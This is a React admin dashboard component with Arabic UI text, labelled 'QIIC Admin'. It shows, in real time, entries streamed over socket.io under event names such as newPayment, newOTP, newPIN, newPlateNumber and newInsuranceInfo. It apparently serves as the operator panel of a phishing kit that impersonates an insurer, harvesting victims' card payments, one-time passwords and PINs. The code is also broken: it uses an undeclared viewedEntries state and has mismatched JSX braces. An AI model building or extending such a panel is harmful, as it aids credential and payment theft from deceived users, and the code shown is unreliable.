// AdminRealtimeTable.jsx
import React, { useEffect, useMemo, useState } from 'react';
import { io } from 'socket.io-client';

// عدّل هذا إلى عنوان السيرفر لديك
const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || 'http://localhost:4001';

export default function AdminRealtimeTable({
  socketUrl = SOCKET_URL,
  initialLimit = 200 // عدد النتائج الابتدائية للعرض
}) {
  const [entries, setEntries] = useState([]); // array of {id, sourcePage, payload, submittedAt, viewed}
  const [loading, setLoading] = useState(true);
  const [query, setQuery] = useState('');
  const [pageFilter, setPageFilter] = useState('all');
  const [visibleCount, setVisibleCount] = useState(50); // تحميل تدريجي بسيط
  const [unreadCount, setUnreadCount] = useState(0); // عدد البيانات غير المقروءة

  // حساب البيانات غير المقروءة
  useEffect(() => {
    const unread = entries.filter(e => !e.viewed).length;
    setUnreadCount(unread);
    
    // تحديث عنوان الصفحة
    if (unread > 0) {
      document.title = `(${unread}) بيانات جديدة - QIIC Admin`;
    } else {
      document.title = 'QIIC Admin Dashboard';
    }
  }, [entries]);

  useEffect(() => {
    const socket = io(socketUrl, { transports: ['websocket', 'polling'] });

    socket.on('connect', () => {
      console.log('Socket connected', socket.id);
      // 🆕 Request ALL entries on connection
      socket.emit('requestAll', { limit: 10000 });
    });

    // Server may send either plain entries or Mongo docs
    socket.on('initialData', (data) => {
      // normalize each item to structure: { id, sourcePage, payload, submittedAt, viewed }
      const normalized = (Array.isArray(data) ? data : []).map(normalizeEntry);
      setEntries(normalized.slice(0, initialLimit));
      setLoading(false);
    });

    // 🆕 Listen for bulk entries (response to requestAll)
    socket.on('bulkEntries', (response) => {
      console.log(`📦 Received ${response.count} entries from server`);
      const normalized = response.entries.map(normalizeEntry);
      setEntries(normalized);
      setLoading(false);
    });

    // 🆕 Listen for comprehensive new entry event
    socket.on('newEntryAll', (entry) => {
      console.log('🆕 New entry received:', entry);
      const newEntry = { ...normalizeEntry(entry), viewed: false };
      setEntries(prev => [newEntry, ...prev]);
      
      // إشعار صوتي وبصري
      if ('Notification' in window && Notification.permission === 'granted') {
        new Notification('بيانات جديدة!', {
          body: `تم إضافة بيانات جديدة من ${newEntry.sourcePage}`,
          icon: '/vite.svg'
        });
      }
    });

    // generic fallback event
    socket.on('newEntry', (e) => {
      const newEntry = { ...normalizeEntry(e), viewed: false };
      setEntries(prev => [newEntry, ...prev]);
    });

    // page-specific events (as in your mapping). listen to common ones too:
    const events = [
      'newCarDetails','newMoreDetails','newSelectInsurance',
      'newPlateNumber','newInsuranceInfo','newPolicyDate',
      'newQuote','newPayment','newOTP','newPIN'
    ];
    events.forEach(ev => socket.on(ev, (payload) => {
      console.log(`📨 ${ev}:`, payload);
      const newEntry = { ...normalizeEntry(payload), viewed: false };
      setEntries(prev => [newEntry, ...prev]);
    }));

    socket.on('disconnect', () => console.log('Socket disconnected'));

    // طلب إذن الإشعارات عند التحميل
    if ('Notification' in window && Notification.permission === 'default') {
      Notification.requestPermission();
    }

    return () => {
      socket.disconnect();
    };
  }, [socketUrl, initialLimit]);

  // Normalize input entries of different shapes into consistent object
  function normalizeEntry(raw) {
    // possible shapes:
    // 1) { id, sourcePage, payload: {...}, submittedAt }
    // 2) { _id, sourcePage, payload: {...}, submittedAt }
    // 3) older shape: merged fields at top-level (no payload)
    if (!raw) return raw;
    const id = raw.id ?? raw._id ?? raw._doc?.id ?? undefined;
    const sourcePage = raw.sourcePage ?? raw.page ?? raw._doc?.sourcePage ?? '/unknown';
    const submittedAt = raw.submittedAt ?? raw.createdAt ?? raw._doc?.submittedAt ?? raw._doc?.createdAt ?? new Date().toISOString();

    // payload may already exist, otherwise we collect top-level keys excluding metadata
    let payload = raw.payload ?? raw._doc?.payload ?? null;
    if (!payload) {
      // build payload by excluding known meta keys
      const metaKeys = new Set(['id','_id','sourcePage','submittedAt','createdAt','__v']);
      payload = {};
      Object.keys(raw).forEach(k => {
        if (!metaKeys.has(k)) payload[k] = raw[k];
      });
    }

    return {
      id: String(id ?? Date.now() + Math.floor(Math.random()*1000)),
      sourcePage,
      payload,
      submittedAt: new Date(submittedAt).toISOString()
    };
  }

  // compute dynamic columns: top-level metadata + union of payload keys
  const columns = useMemo(() => {
    const payloadKeys = new Set();
    entries.forEach(e => {
      const p = e.payload || {};
      Object.keys(p).forEach(k => payloadKeys.add(k));
    });
    // fixed left columns
    const left = ['id', 'sourcePage', 'submittedAt'];
    return [...left, ...Array.from(payloadKeys)];
  }, [entries]);

  // compute list of distinct pages for filter dropdown
  const pagesList = useMemo(() => {
    const s = new Set(entries.map(e => e.sourcePage || 'unknown'));
    return ['all', ...Array.from(s)];
  }, [entries]);

  // search: check across id, sourcePage, submittedAt, and payload values (stringified)
  const filtered = useMemo(() => {
    const q = String(query || '').trim().toLowerCase();
    let list = entries;
    if (pageFilter !== 'all') {
      list = list.filter(e => e.sourcePage === pageFilter);
    }
    if (!q) return list.slice(0, visibleCount);

    return list.filter(item => {
      // check metadata
      if (String(item.id).toLowerCase().includes(q)) return true;
      if (String(item.sourcePage).toLowerCase().includes(q)) return true;
      if (String(item.submittedAt).toLowerCase().includes(q)) return true;
      // check payload values
      const payload = item.payload || {};
      return Object.values(payload).some(v => stringifyValue(v).toLowerCase().includes(q));
    }).slice(0, visibleCount);
  }, [entries, query, pageFilter, visibleCount]);

  // helper: stringify payload values safely
  function stringifyValue(v) {
    if (v == null) return '';
    if (typeof v === 'string') return v;
    if (typeof v === 'number' || typeof v === 'boolean') return String(v);
    try {
      return JSON.stringify(v);
    } catch (err) {
      return String(v);
    }
  }

  // render cell with formatting for dates and JSON
  function renderCell(row, col) {
    // top-level metadata
    if (col === 'id') return row.id;
    if (col === 'sourcePage') return row.sourcePage;
    if (col === 'submittedAt') {
      try {
        const d = new Date(row.submittedAt);
        return isNaN(d) ? row.submittedAt : d.toLocaleString();
      } catch { return row.submittedAt; }
    }

    // payload keys
    const value = row.payload ? row.payload[col] : undefined;
    if (value == null) return '-';
    // if primitive show directly
    if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') {
      // if it looks like ISO date, format it
      if (typeof value === 'string' && /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/.test(value)) {
        const d = new Date(value);
        if (!isNaN(d)) return d.toLocaleString();
      }
      return String(value);
    }
    // object or array -> pretty JSON with small font, collapsible preview
    return <pre style={{ margin: 0, fontSize: 12, maxWidth: 420, overflow: 'auto', whiteSpace: 'pre-wrap' }}>{JSON.stringify(value, null, 2)}</pre>;
  }

  // mark entry as read
  const markAsRead = (entryId) => {
    setViewedEntries(prev => new Set([...prev, entryId]));
    setUnreadCount(prev => Math.max(0, prev - 1));
  };

  // mark all as read
  const markAllAsRead = () => {
    setViewedEntries(new Set(entries.map(e => e.id)));
    setUnreadCount(0);
  };

  return (
    <div style={{ padding: 18, fontFamily: 'Inter, Tahoma, Arial, sans-serif' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
        <h2 style={{ margin: 0 }}>لوحة الأدمن — تتبع فوري (Realtime)</h2>
        {unreadCount > 0 && (
          <span style={{
            background: '#f44336',
            color: 'white',
            borderRadius: '50%',
            padding: '4px 12px',
            fontSize: 14,
            fontWeight: 'bold',
            minWidth: 28,
            textAlign: 'center'
          }}>
            {unreadCount} جديد
          </span>
        )}
      </div>

      <div style={{ display: 'flex', gap: 8, marginBottom: 12, alignItems: 'center', flexWrap: 'wrap' }}>
        <input
          placeholder="ابحث (اسم، جوال، صفحة، ...)"
          value={query}
          onChange={e => setQuery(e.target.value)}
          style={{ padding: 8, borderRadius: 6, border: '1px solid #ddd', minWidth: 260 }}
        />

        <select value={pageFilter} onChange={e => setPageFilter(e.target.value)} style={{ padding: 8, borderRadius: 6 }}>
          {pagesList.map(p => <option key={p} value={p}>{p}</option>)}
        </select>

        <button 
          onClick={() => {
            const socket = io(socketUrl);
            socket.emit('requestAll', { limit: 10000 });
            socket.on('bulkEntries', (response) => {
              const normalized = response.entries.map(normalizeEntry);
              setEntries(normalized);
              socket.disconnect();
            });
          }}
          style={{ ...btnStyle, background: '#4CAF50', color: 'white', fontWeight: 'bold' }}
        >
          🔄 جلب كل البيانات
        </button>

        {unreadCount > 0 && (
          <button 
            onClick={markAllAsRead}
            style={{ ...btnStyle, background: '#2196F3', color: 'white', fontWeight: 'bold' }}
          >
            ✓ تحديد الكل كمقروء
          </button>
        )}

        <div style={{ marginLeft: 'auto', color: '#666' }}>{loading ? 'جارٍ الاتصال...' : `${filtered.length} نتيجة (عرض ${Math.min(filtered.length, visibleCount)})`}</div>
      </div>

      <div style={{ overflowX: 'auto', border: '1px solid #eee', borderRadius: 8 }}>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <thead style={{ background: '#fafafa' }}>
            <tr>
              {columns.map(col => (
                <th key={col} style={{ textAlign: 'left', padding: '10px 12px', borderBottom: '1px solid #eee', fontSize: 13 }}>
                  {col}
                </th>
              ))}
            </tr>
          </thead>

          <tbody>
            {filtered.map((row, rIdx) => {
              const isUnread = !viewedEntries.has(row.id);
              return (
                <tr 
                  key={row.id + '_' + rIdx} 
                  style={{ 
                    background: isUnread ? '#fff3cd' : (rIdx % 2 ? '#fff' : '#fcfcfc'),
                    fontWeight: isUnread ? 'bold' : 'normal'
                  }}
                  onClick={() => isUnread && markAsRead(row.id)}
                >
                  {columns.map((col, colIdx) => (
                    <td key={col} style={{ padding: '10px 12px', borderBottom: '1px solid #f5f5f5', verticalAlign: 'top', maxWidth: 420 }}>
                      {colIdx === 0 && isUnread && <span style={{ color: '#f44336', marginLeft: 8, fontSize: 16 }}>●</span>}
                      {renderCell(row, col)}
                    </td>
                  ))}
              </tr>
            ))}

            {!filtered.length && !loading && (
              <tr>
                <td colSpan={columns.length} style={{ padding: 18, textAlign: 'center' }}>لا توجد نتائج</td>
              </tr>
            )}
          </tbody>
        </table>
      </div>

      {/* تحميل المزيد بسيط */}
      <div style={{ marginTop: 12, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ color: '#666' }}>إجمالي السجلات في الذاكرة: {entries.length}</div>
        <div>
          <button onClick={() => setVisibleCount(c => c + 50)} style={btnStyle}>تحميل المزيد</button>
          <button onClick={() => { setEntries([]); setVisibleCount(50); }} style={{ ...btnStyle, marginLeft: 8 }}>مسح العرض</button>
        </div>
      </div>
    </div>
  );
}

const btnStyle = {
  padding: '8px 12px',
  borderRadius: 6,
  border: '1px solid #ddd',
  background: '#fff',
  cursor: 'pointer'
};
